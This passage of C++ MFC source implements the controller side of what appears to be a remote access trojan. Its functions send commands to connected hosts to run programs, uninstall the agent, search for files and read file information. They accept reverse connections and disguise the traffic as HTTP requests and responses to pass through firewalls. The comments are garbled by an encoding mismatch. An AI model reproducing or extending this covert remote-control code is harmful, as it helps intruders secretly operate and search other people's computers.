		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_MODIFYPROPERTY_DISKDRIVE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_MODIFYPROPERTY_DISKDRIVE,
		m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_MODIFYPROPERTY_DISKDRIVE,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_MODIFYPROPERTY_DISKDRIVE,dwResult);
}

void CFileSocket::Command_RemoteRun(CString strHostName,
									CString strFilename,CString strParam,int nShowCmd)
{
	int nFilenameLen=strFilename.GetLength();
	int nParamLen=strParam.GetLength();
	m_ArrayBuffer.SetSize(sizeof(nShowCmd)+nFilenameLen+1+nParamLen+1);
	memcpy(&m_ArrayBuffer[0],&nShowCmd,sizeof(nShowCmd));
	memcpy(&m_ArrayBuffer[0]+sizeof(nShowCmd),(LPCSTR)strFilename,nFilenameLen+1);
	memcpy(&m_ArrayBuffer[0]+sizeof(nShowCmd)+nFilenameLen+1,(LPCSTR)strParam,nParamLen+1);
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTERUN,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_REMOTERUN,
		m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTERUN,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTERUN,dwResult);
}

void CFileSocket::Command_RemoteUninstall(CString strHostName)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTEUNINSTALL,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,0,CMD_REMOTEUNINSTALL);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTEUNINSTALL,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTEUNINSTALL,dwResult);
}

void CFileSocket::Command_FindFile(CString strHostName,CString strFindDir,
								   CString strFindFile,BOOL bSearchSubdir)
{
	int nFindDirLen=strFindDir.GetLength();
	int nFindFileLen=strFindFile.GetLength();
	m_ArrayBuffer.SetSize(sizeof(bSearchSubdir)+nFindDirLen+1+nFindFileLen+1);
	memcpy(&m_ArrayBuffer[0],&bSearchSubdir,sizeof(bSearchSubdir));
	memcpy(&m_ArrayBuffer[0]+sizeof(bSearchSubdir),(LPCSTR)strFindDir,nFindDirLen+1);
	memcpy(&m_ArrayBuffer[0]+sizeof(bSearchSubdir)+nFindDirLen+1,(LPCSTR)strFindFile,nFindFileLen+1);
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_FINDFILE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_FINDFILE,
		m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_FINDFILE,0);
				return;	//ʧ��
			}
		}

		DWORD dwDataSize=RecvCommandDataSize(m_hConnectSocket);
		m_ArrayBuffer.SetSize(dwDataSize);
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),dwDataSize);
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_FINDFILE,dwResult);
}

void CFileSocket::Command_ShowNote(CString strHostName)
{
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWNOTE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,0,CMD_SHOWNOTE);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWNOTE,0);
				return;	//ʧ��
			}
		}

		SERVER_CONFIG stServerConfig;
		m_ArrayBuffer.SetSize(sizeof(stServerConfig.cNote));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(stServerConfig.cNote));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWNOTE,dwResult);
}

void CFileSocket::Command_GetFileInfo(CString strHostName,CString strFilename)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strFilename.GetLength()+1+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_GETFILEINFO,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_GETFILEINFO,
		(BYTE*)(LPCSTR)strFilename,strFilename.GetLength()+1);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_GETFILEINFO,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(RECV_GETFILEINFO_INFO));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(RECV_GETFILEINFO_INFO));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_GETFILEINFO,dwResult);
}

//////private///////////////////////////////////////////////
void CFileSocket::CStringToChar(char* cText,CString strText)
{
	UINT nSize=strText.GetLength();
	memcpy(cText,strText.GetBuffer(nSize),nSize);
}

CString CFileSocket::CharToCString(char* cText,UINT nSize)
{
	CString strText;
	memcpy(strText.GetBuffer(nSize),cText,nSize);
	strText.ReleaseBuffer();
	return strText;
}

void CFileSocket::CreateMultilevelDir(CString strDirName)
{
	if(strDirName.GetAt(strDirName.GetLength()-1)!='\\')
		strDirName+="\\";
	CString strTemp=strDirName;
	while(1)
	{
		int nCount=strTemp.Find("\\");
		if(nCount!=-1)
		{
			CString strDir=strDirName.Mid(0,nCount+1);
			CreateDirectory(strDir,NULL);
			strTemp.SetAt(nCount,'|');
		}
		else
			break;
	}
}

//************************************************************************//
int	CFileSocket::SendCommand(SOCKET hSocket,int nControlCode,DWORD dwCommand,BYTE* byBuf,DWORD dwBufSize,BOOL bProgress)
{
	DWORD dwSendBufSize;
	BYTE* SendBuf;
	switch(nControlCode)
	{
		case 0:	//ֻ��������
		{
			dwSendBufSize=sizeof(dwCommand);
			SendBuf=new BYTE[dwSendBufSize];
			memcpy(SendBuf,&dwCommand,sizeof(dwCommand));
			break;
		}
		case 1:	//�������������
		{
			dwSendBufSize=sizeof(dwCommand)+dwBufSize;
			SendBuf=new BYTE[dwSendBufSize];
			memcpy(SendBuf,&dwCommand,sizeof(dwCommand));
			memcpy(SendBuf+sizeof(dwCommand),byBuf,dwBufSize);
			break;
		}
		case 2:	//��������,������С�Ͳ���
		{
			dwSendBufSize=sizeof(dwCommand)+sizeof(dwBufSize)+dwBufSize;
			SendBuf=new BYTE[dwSendBufSize];
			memcpy(SendBuf,&dwCommand,sizeof(dwCommand));
			memcpy(SendBuf+sizeof(dwCommand),&dwBufSize,sizeof(dwBufSize));
			memcpy(SendBuf+sizeof(dwCommand)+sizeof(dwBufSize),byBuf,dwBufSize);
			break;
		}
		case 3:	//ֻ���Ͳ���
		{
			dwSendBufSize=dwBufSize;
			SendBuf=byBuf;
			break;
		}
	}

	while(1)
	{
		int nRet=send(m_hConnectSocket,(char*)SendBuf,dwSendBufSize,NULL);
		if(nRet==SOCKET_ERROR)
		{
			if(WSAGetLastError()==WSAEWOULDBLOCK)
			{
				Sleep(50);
				continue;
			}
			else
			{
				if(nControlCode!=3)
					delete[] SendBuf;
				return 0;	//ʧ��
			}
		}
		else
			break;	//�ɹ�
	}
	if(bProgress)
		m_pProgress->OffsetPos(PROGRESS_RANGE/3);
	if(nControlCode!=3)
		delete[] SendBuf;

	return 1;
}

DWORD CFileSocket::RecvCommandDataSize(SOCKET hSocket)
{
	DWORD dwBufSize;
	while(1)
	{
		int nRet=recv(m_hConnectSocket,(char*)&dwBufSize,sizeof(dwBufSize),NULL);
		if(nRet==SOCKET_ERROR)
		{
			if(WSAGetLastError()==WSAEWOULDBLOCK)
			{
				Sleep(50);
				continue;	//����,����
			}
			else
				return 0;	//ʧ��
		}
		else
			break;	//�ɹ�
	}
	return dwBufSize;
}

int	CFileSocket::RecvCommandData(SOCKET hSocket,BYTE* byBuf,DWORD dwBufSize,BOOL bProgress)
{
	DWORD dwLeft=dwBufSize;
	DWORD dwPoint=0;
	while(dwLeft>0)
	{
		int nRet=recv(m_hConnectSocket,(char*)byBuf+dwPoint,dwLeft,NULL);
		if(nRet==SOCKET_ERROR)
		{
			if(WSAGetLastError()==WSAEWOULDBLOCK)
			{
				Sleep(50);
				continue;
			}
			else
				return 0;
		}
		dwPoint+=nRet;
		dwLeft-=nRet;
	}
	if(bProgress)
		m_pProgress->OffsetPos(PROGRESS_RANGE/3);
	return 1;
}

////////////////////////////////////////////////////////////////
BOOL CFileSocket::HttpTunnelSendHeader(DWORD dwDataSize)//����HTTPͷ
{
	CString strHttpResponseHeader;
	strHttpResponseHeader.Format(HTTP_RESPONSE_HEADER,dwDataSize);

	while(1)
	{
		int nRet=send(m_hConnectSocket,strHttpResponseHeader.GetBuffer(strHttpResponseHeader.GetLength()),strHttpResponseHeader.GetLength(),NULL);
		if(nRet==SOCKET_ERROR)
		{
			if(WSAGetLastError()==WSAEWOULDBLOCK)
			{
				Sleep(50);
				continue;
			}
			else
				return FALSE;	//ʧ��
		}
		else
			break;	//�ɹ�
	}
	return TRUE;
}

BOOL CFileSocket::HttpTunnelRecvHeader()//����HTTPͷ
{
	SOCKADDR_IN clientaddr;
	int len=sizeof(clientaddr);

	closesocket(m_hConnectSocket);//�ر���һ�ε�����Socket
	while(1)
	{
		m_hConnectSocket=accept(m_hListenSocket,(SOCKADDR*)&clientaddr,&len);
		if(m_hConnectSocket==INVALID_SOCKET)
		{
			if(WSAGetLastError()==WSAEWOULDBLOCK)
			{
				Sleep(50);
				continue;
			}
			else
				return FALSE;	//ʧ��
		}
		else
			break;	//�ɹ�
	}
	//////////////////////////////////////////////////////////
	BYTE byBuffer[1024];
	int nRet;

	while(1)//����POST����,��HTTPͷ
	{
		ZeroMemory(byBuffer,sizeof(byBuffer));

		nRet=recv(m_hConnectSocket,(char*)&byBuffer,sizeof(byBuffer),MSG_PEEK);//ֻ�Ǹ��Ƴ���
		if(nRet==SOCKET_ERROR)
		{
			if(WSAGetLastError()==WSAEWOULDBLOCK)
			{
				Sleep(50);
				continue;
			}
			else
				return FALSE;	//ʧ��
		}
		else
		{
			//����0x0D 0x0A��β,������0x0D 0x0A 0x0D 0x0A
			if(byBuffer[nRet-2]==0x0D && byBuffer[nRet-1]==0x0A && byBuffer[nRet-4]!=0x0D && byBuffer[nRet-3]!=0x0A)
			{
				//��HTTPͷ,����������
				if(byBuffer[0]=='P' && byBuffer[1]=='O' && byBuffer[2]=='S' && byBuffer[3]=='T')
				{
					//�����в���0x0D 0x0A 0x0D 0x0A,Ҳ����˵������HTTPͷ+���ݵ����
					CString strBuffer;
					memcpy(strBuffer.GetBufferSetLength(nRet),byBuffer,nRet);
					strBuffer.ReleaseBuffer(nRet);

					int nPos=strBuffer.Find("\r\n\r\n");
					if(nPos==-1)
					{
						recv(m_hConnectSocket,(char*)&byBuffer,nRet,NULL);//����һ��ͷ���ջ���,���ӽ��ջ����������
						continue;
					}
				}			
			}
			break;	//�ɹ�
		}
	}

	CString strBuffer;
	memcpy(strBuffer.GetBufferSetLength(nRet),byBuffer,nRet);
	strBuffer.ReleaseBuffer(nRet);

	int nPos=strBuffer.Find("\r\n\r\n");
	if(nPos==-1)//�������������
	{
		nPos=strBuffer.Find("\r\n");
		if(nPos==-1)//��ô�����Ҳ���,����ʧ�ܰ�
			return FALSE;
		else
			nPos=-2;
	}

	recv(m_hConnectSocket,(char*)&byBuffer,nPos+4,NULL);//��HTTPͷ�ջ���

	return TRUE;
}
